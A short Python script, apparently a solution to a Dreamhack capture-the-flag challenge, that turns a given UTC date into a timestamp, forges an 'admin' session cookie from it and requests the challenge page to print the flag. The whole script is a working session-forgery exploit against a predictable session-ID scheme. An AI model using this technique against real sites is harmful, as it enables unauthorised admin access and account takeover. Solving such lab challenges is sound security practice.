import requests
from datetime import datetime, timezone

url = "http://host1.dreamhack.games:14984/"

date_str = "25/02/2026, 07:26:12 UTC"
# 문자열을 다시 datetime 객체로 변환
dt = datetime.strptime(date_str, "%d/%m/%Y, %H:%M:%S UTC").replace(tzinfo=timezone.utc)
timestamp = int(dt.timestamp())

sessionid = f"admin.{timestamp * 2026}"

cookies = {"session" : sessionid}
  
response = requests.get(url, cookies=cookies)
  
if "DH{" in response.text:
  print(f"Found!\nSession ID: {timestamp}\nData: {response.text}")
else:
  print("Fail")
